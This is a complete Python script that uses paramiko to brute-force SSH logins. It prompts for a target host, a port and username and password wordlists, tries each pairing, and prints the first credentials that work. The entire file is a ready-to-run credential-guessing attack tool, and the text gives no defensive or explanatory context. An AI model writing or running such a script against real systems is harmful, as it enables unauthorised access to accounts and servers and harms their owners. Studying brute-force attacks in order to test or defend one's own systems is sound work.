import paramiko

def ssh_brute_force(host, port, username_file, password_file):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(username_file, 'r') as uf:
        usernames = uf.read().splitlines()
    
    with open(password_file, 'r') as pf:
        passwords = pf.read().splitlines()
    
    for username in usernames:
        for password in passwords:
            try:
                client.connect(host, port=port, username=username, password=password, timeout=3)
                print(f"Successful login: {username}:{password}")
                return
            except paramiko.AuthenticationException:
                continue
    print("Brute force failed")

if __name__ == "__main__":
    host = input("Enter the target host: ")
    port = int(input("Enter the target port: "))
    username_file = input("Enter the username wordlist file path: ")
    password_file = input("Enter the password wordlist file path: ")
    ssh_brute_force(host, port, username_file, password_file)
